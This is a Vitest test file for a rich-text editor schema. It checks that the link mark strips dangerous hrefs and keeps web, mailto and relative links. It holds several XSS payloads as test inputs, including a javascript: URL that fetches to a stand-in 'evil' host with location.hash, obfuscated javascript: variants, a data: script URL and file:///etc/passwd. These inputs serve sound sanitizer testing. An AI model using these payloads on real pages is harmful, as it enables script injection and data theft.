import { describe, it, expect } from "vitest";
import { steleSchema } from "../src/index.ts";

/**
 * 連結 href 淨化:markdown-it 的 validateLink 只擋得住 markdown 路徑,
 * 貼上 HTML 走 DOMParser 進來的 href 不經它;schema 這層自己保證,不倚賴上游解析器設定。
 */

type DomSpec = [string, Record<string, unknown>, ...unknown[]];

function renderHref(href: string): string | null {
  const mark = steleSchema.marks["link"]!.create({ href });
  const spec = steleSchema.marks["link"]!.spec.toDOM!(mark, false) as DomSpec;
  return (spec[1]["href"] ?? null) as string | null;
}

describe("link mark href 淨化", () => {
  it("剝除 javascript: — 渲染成不可點的 <a>,而非可執行連結", () => {
    expect(renderHref("javascript:fetch('//evil/'+location.hash)")).toBeNull();
  });

  it("剝除大小寫混雜、前導空白與內嵌控制字元的 javascript:", () => {
    expect(renderHref("JaVaScRiPt:alert(1)")).toBeNull();
    expect(renderHref("  javascript:alert(1)")).toBeNull();
    expect(renderHref("java\nscript:alert(1)")).toBeNull();
    expect(renderHref("java\tscript:alert(1)")).toBeNull();
    expect(renderHref("javascript:alert(1)")).toBeNull();
  });

  it("剝除 data: 與 vbscript: 等其他可執行 scheme", () => {
    expect(renderHref("data:text/html,<script>alert(1)</script>")).toBeNull();
    expect(renderHref("vbscript:msgbox(1)")).toBeNull();
    expect(renderHref("file:///etc/passwd")).toBeNull();
  });

  it("保留 http / https / mailto", () => {
    expect(renderHref("https://example.com/a?b=1#c")).toBe("https://example.com/a?b=1#c");
    expect(renderHref("http://example.com")).toBe("http://example.com");
    expect(renderHref("HTTPS://example.com")).toBe("HTTPS://example.com");
    expect(renderHref("mailto:someone@example.com")).toBe("mailto:someone@example.com");
  });

  it("保留相對連結與錨點(筆記間互連的常態)", () => {
    expect(renderHref("./其他筆記.md")).toBe("./其他筆記.md");
    expect(renderHref("../a/b.md")).toBe("../a/b.md");
    expect(renderHref("/absolute/path.md")).toBe("/absolute/path.md");
    expect(renderHref("#錨點")).toBe("#錨點");
    expect(renderHref("其他 筆記.md")).toBe("其他 筆記.md");
  });
});
